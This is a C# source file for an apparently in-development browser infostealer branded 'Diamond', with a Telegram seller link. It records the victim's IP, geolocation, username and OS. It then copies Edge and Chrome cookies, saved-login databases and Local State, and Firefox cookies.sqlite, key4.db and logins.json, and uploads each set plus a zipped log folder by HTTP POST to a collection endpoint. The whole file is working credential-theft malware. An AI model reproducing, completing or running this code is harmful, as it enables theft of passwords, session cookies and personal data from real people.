using System;
using System.Buffers.Text;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System.Net;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Web;
using System.Net.Sockets;
using System.Data.SqlTypes;
using System.Diagnostics.Metrics;
using System.Xml;
using System.Data.SqlClient;
using System.Data.SQLite;
using System.Data;
using System.Reflection.Metadata;
using System.Text.Json;
using System.Globalization;
using System.IO.Compression;

namespace Getter
{
    class Program
    {
        static string GenerateRandomString(int length)
        {
            const string validChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            var random = new Random();
            var buffer = new char[length];
            for (int i = 0; i < length; i++)
            {
                buffer[i] = validChars[random.Next(validChars.Length)];
            }
            return new string(buffer);
        }

        static string getDefaultFirefoxUser(string browserPath)
        {
            string[] defaultFolder = Directory.GetDirectories(browserPath + @"\Firefox\Profiles");
            foreach (string userPath in defaultFolder)
            {
                string folderName = Path.GetFileName(userPath);
                if (folderName.Contains("release"))
                {
                    return folderName;
                }
            }
            return "";
        }

        static string[] GetIpData(string ipAddress)
        {
            string apiUrl = $"http://ip-api.com/json/{ipAddress}";

            using (WebClient client = new WebClient())
            {
                string response = client.DownloadString(apiUrl);
                var jsonDocument = JsonDocument.Parse(response);
                JsonElement root = jsonDocument.RootElement;
                string countryCode = root.GetProperty("countryCode").GetString();
                string zip = root.GetProperty("zip").GetString();
                string city = root.GetProperty("city").GetString();
                string regionName = root.GetProperty("regionName").GetString();
                string country = root.GetProperty("country").GetString();
                string timezone = root.GetProperty("timezone").GetString();
                string[] userData = { countryCode, zip, city, regionName, country, timezone };
                return userData;
            }
        }

        static async Task Main(string[] args)
        {
            Console.WriteLine("Is started...");

            string clientServer = "http://localhost:5181/api/upload";
            string? word = Console.ReadLine();
            Console.WriteLine(word + "\n");

            string detectLocalFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string detectRoamingFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            /*string randomFolderName = GenerateRandomString(16);
            string myFolder = detectLocalFolderPath + @"\" + randomFolderName;*/            
            string myFolder = @"C:\Users\Agent\Desktop" + @"\logFolder";

            string passwordsFolder = @"\Passwords";
            string cookiesFolder = @"\Cookies";

            Directory.CreateDirectory(myFolder);
            Directory.CreateDirectory(myFolder + passwordsFolder);
            Directory.CreateDirectory(myFolder + cookiesFolder);

            using (StreamWriter writer = File.CreateText(myFolder + @"\Info.txt"))
            {
                string botLogo = @"  _____  _                                 _ " + "\n" +
                @" |  __ \(_)                               | |" + "\n" +
                @" | |  | |_  __ _ _ __ ___   ___  _ __   __| |" + "\n" +
                @" | |  | | |/ _` | '_ ` _ \ / _ \| '_ \ / _` |" + "\n" +
                @" | |__| | | (_| | | | | | | (_) | | | | (_| |" + "\n" +
                @" |_____/|_|\__,_|_| |_| |_|\___/|_| |_|\__,_|" + "\n\n" +
                "--> - https://t.me/sellerofdiamond_bot - <--\n\n";
                try
                {
                    string ip = new WebClient().DownloadString("https://api.ipify.org");
                    CultureInfo currentCulture = CultureInfo.CurrentCulture;
                    string[] ipData = GetIpData(ip);
                    string userInfo = $"IP: {ip}\n" +
                        $"Username: {Environment.UserName}\n" +
                        $"Country: {ipData[0]}\n" +
                        $"Zip code: {ipData[1]}\n" +
                        $"Location: {ipData[2]}, {ipData[3]}, {ipData[4]}\n" +
                        $"Language: {currentCulture.TwoLetterISOLanguageName}\n" +
                        $"Timezone: {ipData[5]}\n" +
                        $"OS: {Environment.OSVersion.ToString()}\n" +
                        $"Log date: {DateTime.Now}";

                    writer.WriteLine(botLogo + userInfo);
                    Console.WriteLine($"{botLogo}{userInfo}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
            /*Directory.CreateDirectory(myFolder + autoFillsFolder);*/

            string zipFilePath = @"C:\Users\Agent\Desktop\archive.zip";
            ZipFile.CreateFromDirectory(myFolder, zipFilePath);

            string path = "";
            string edgePath = detectLocalFolderPath + @"\Microsoft";
            string chromePath = detectLocalFolderPath + @"\Google";
            string firefoxPath = detectRoamingFolderPath + @"\Mozilla";
            var firefoxUser = getDefaultFirefoxUser(firefoxPath);
            string operaPath = detectLocalFolderPath + @"\Opera Software";

            if (edgePath != null)
            {
                Directory.CreateDirectory(myFolder + cookiesFolder + @"\Edge");

                File.Copy(edgePath + @"\Edge\User Data\Default\Network\Cookies", myFolder + cookiesFolder + @"\Edge\Cookies", true);
                File.Copy(edgePath + @"\Edge\User Data\Local State", myFolder + cookiesFolder + @"\Edge\Local State", true);
                File.Copy(edgePath + @"\Edge\User Data\Default\Login Data", myFolder + cookiesFolder + @"\Edge\Login Data", true);


                using (var edgeClient = new HttpClient())
                {
                    var loginDataFile = File.OpenRead(myFolder + cookiesFolder + @"\Edge\Login Data");
                    var localStateFile = File.OpenRead(myFolder + cookiesFolder + @"\Edge\Local State");
                    var cookiesFile = File.OpenRead(myFolder + cookiesFolder + @"\Edge\Cookies");

                    var loginDataContent = new StreamContent(loginDataFile);
                    var localStateContent = new StreamContent(localStateFile);
                    var cookiesContent = new StreamContent(cookiesFile);

                    using (var formData = new MultipartFormDataContent())
                    {
                        formData.Add(loginDataContent, "edgeLoginData", myFolder + cookiesFolder + @"\Edge\Login Data");
                        formData.Add(localStateContent, "edgeLocalState", myFolder + cookiesFolder + @"\Edge\Local State");
                        formData.Add(cookiesContent, "edgeCookies", myFolder + cookiesFolder + @"\Edge\Cookies");

                        var response = await edgeClient.PostAsync(clientServer, formData);

                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine("Edge uploaded successfully.");
                        }
                        else
                        {
                            Console.WriteLine($"Failed to upload file: {response.ReasonPhrase}");
                        }
                    }
                }

                // REMOVE THIS IN FINAL
                Console.WriteLine("Edge is copied!");
            }

            if (chromePath != null)
            {
                Directory.CreateDirectory(myFolder + cookiesFolder + @"\Chrome");
                File.Copy(chromePath + @"\Chrome\User Data\Default\Network\Cookies", myFolder + cookiesFolder + @"\Chrome\Cookies", true);
                File.Copy(chromePath + @"\Chrome\User Data\Local State", myFolder + cookiesFolder + @"\Chrome\Local State", true);
                File.Copy(chromePath + @"\Chrome\User Data\Default\Login Data", myFolder + cookiesFolder + @"\Chrome\Login Data", true);


                using (var chromeClient = new HttpClient())
                {
                    var loginDataFile = File.OpenRead(myFolder + cookiesFolder + @"\Chrome\Login Data");
                    var localStateFile = File.OpenRead(myFolder + cookiesFolder + @"\Chrome\Local State");
                    var cookiesFile = File.OpenRead(myFolder + cookiesFolder + @"\Chrome\Cookies");

                    var loginDataContent = new StreamContent(loginDataFile);
                    var localStateContent = new StreamContent(localStateFile);
                    var cookiesContent = new StreamContent(cookiesFile);

                    using (var formData = new MultipartFormDataContent())
                    {
                        formData.Add(loginDataContent, "chromeLoginData", myFolder + cookiesFolder + @"\Chrome\Login Data");
                        formData.Add(localStateContent, "chromeLocalState", myFolder + cookiesFolder + @"\Chrome\Local State");
                        formData.Add(cookiesContent, "chromeCookies", myFolder + cookiesFolder + @"\Chrome\Cookies");

                        var response = await chromeClient.PostAsync(clientServer, formData);

                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine("Chrome uploaded successfully.");
                        }
                        else
                        {
                            Console.WriteLine($"Failed to upload file: {response.ReasonPhrase}");
                        }
                    }
                }

                // REMOVE THIS IN FINAL
                Console.WriteLine("Chrome is copied!");
            }

            if (firefoxPath != null)
            {
                Directory.CreateDirectory(myFolder + cookiesFolder + @"\Firefox");
                File.Copy(firefoxPath + @"\Firefox\Profiles\" + firefoxUser + @"\cookies.sqlite", myFolder + cookiesFolder + @"\Firefox\cookies.sqlite", true);
                File.Copy(firefoxPath + @"\Firefox\Profiles\" + firefoxUser + @"\key4.db", myFolder + cookiesFolder + @"\Firefox\key4.db", true);
                File.Copy(firefoxPath + @"\Firefox\Profiles\" + firefoxUser + @"\logins.json", myFolder + cookiesFolder + @"\Firefox\logins.json", true);


                using (var firefoxClient = new HttpClient())
                {
                    var loginsFile = File.OpenRead(myFolder + cookiesFolder + @"\Firefox\logins.json");
                    var key4File = File.OpenRead(myFolder + cookiesFolder + @"\Firefox\key4.db");
                    var cookiesFile = File.OpenRead(myFolder + cookiesFolder + @"\Firefox\cookies.sqlite");

                    var loginsContent = new StreamContent(loginsFile);
                    var key4Content = new StreamContent(key4File);
                    var cookiesContent = new StreamContent(cookiesFile);

                    using (var formData = new MultipartFormDataContent())
                    {
                        formData.Add(loginsContent, "firefoxLogins", myFolder + cookiesFolder + @"\Firefox\logins.json");
                        formData.Add(key4Content, "key4", myFolder + cookiesFolder + @"\Firefox\key4.db");
                        formData.Add(cookiesContent, "firefoxCookies", myFolder + cookiesFolder + @"\Firefox\cookies.sqlite");

                        var response = await firefoxClient.PostAsync(clientServer, formData);

                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine("Firefox uploaded successfully.");
                        }
                        else
                        {
                            Console.WriteLine($"Failed to upload file: {response.ReasonPhrase}");
                        }
                    }
                }

                // REMOVE THIS IN FINAL
                Console.WriteLine("Firefox is copied!");
            }




            if (operaPath != null)
            {
                // DO IT
                // code
            }

            using (HttpClient client = new HttpClient())
            {
                byte[] fileBytes = await File.ReadAllBytesAsync(zipFilePath);

                ByteArrayContent fileContent = new ByteArrayContent(fileBytes);
                fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");

                using (MultipartFormDataContent formData = new MultipartFormDataContent())
                {
                    formData.Add(fileContent, "logContent", Path.GetFileName(zipFilePath));

                    HttpResponseMessage response = await client.PostAsync(clientServer, formData);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("Archive sent successfully.");
                    }
                    else
                    {
                        Console.WriteLine($"Error sending the archive. Status Code: {response.StatusCode}");
                    }
                }
            }
            // DO IT ^ FOR THE OTHER BROWSERS
            // pack this FOLDER to archive           



            /* string MyFolderPath = @"C:\Users\Agent\Desktop\CFolder";
             string CCFolder = @"\CC";
             string GrabbedFilesFolder = @"\Files";*/

            Console.ReadLine();
        }
    }
}
